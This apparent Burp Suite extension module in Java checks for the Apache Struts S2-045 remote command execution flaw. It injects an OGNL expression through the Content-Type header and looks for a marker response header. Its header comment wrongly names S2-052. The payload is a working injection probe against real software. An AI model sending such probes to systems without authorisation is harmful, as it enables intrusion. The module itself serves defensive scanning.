package burp.j2ee.issues.impl;

import static burp.HTTPMatcher.isJavaApplicationByURL;

import burp.*;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

/**
 * Apache Struts S2-052 REST Plugin XStream Remote Command Execution
 *
 *
 * https://struts.apache.org/docs/s2-052.html
 * https://lgtm.com/blog/apache_struts_CVE-2017-9805_announcement
 * http://blog.csdn.net/caiqiiqi/article/details/77861477
 *
 *
 */
public class StrutsS2045 implements IModule {

    private static final String TITLE = "Apache Struts S2-045 RCE";
    private static final String DESCRIPTION = "J2EEscan identified a potential remote command execution.<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "https://struts.apache.org/docs/s2-045.html<br />"
            + "https://github.com/vulhub/vulhub/tree/master/struts2/s2-045<br />"
            + "https://github.com/ronoski/VulApps/tree/master/s/struts2/s2-045";

    private static final String REMEDY = "Upgrade to Apache Struts version 2.5.13 or 2.3.34";


    private PrintWriter stderr;
    private PrintWriter stdout;

    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        stdout = new PrintWriter(callbacks.getStderr(), true);
        String contentTypeHeaderPayload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('attack3r',233*233)}.multipart/form-data";
        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();

        List<IScanIssue> issues = new ArrayList<>();

        String contentTypeHeader = HTTPParser.getRequestHeaderValue(reqInfo, "Content-type");

        if (contentTypeHeader == null){
            return issues;
        }

        // Change Content-Type header
        List<String> headers = reqInfo.getHeaders();
        List<String> headersWithContentTypePayload = HTTPParser.addOrUpdateHeader(headers, "Content-type", contentTypeHeaderPayload);

        String request = helpers.bytesToString(baseRequestResponse.getRequest());
        String requestBody = request.substring(reqInfo.getBodyOffset());

        //  Build request with serialization header
        byte[] message = helpers.buildHttpMessage(headersWithContentTypePayload, requestBody.getBytes());
        IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), message);

        IResponseInfo resInfo = helpers.analyzeResponse(resp.getResponse());
        List<String> responseHeaders = resInfo.getHeaders();

        for (int h = 0; h < responseHeaders.size(); h++) {
            if (responseHeaders.get(h).contains("attack3r")){
                issues.add(new CustomScanIssue(
                        baseRequestResponse.getHttpService(),
                        reqInfo.getUrl(),
                        resp,
                        TITLE,
                        DESCRIPTION,
                        REMEDY,
                        Risk.High,
                        Confidence.Certain));
                return issues;
            }
        }

        return issues;

    }
}
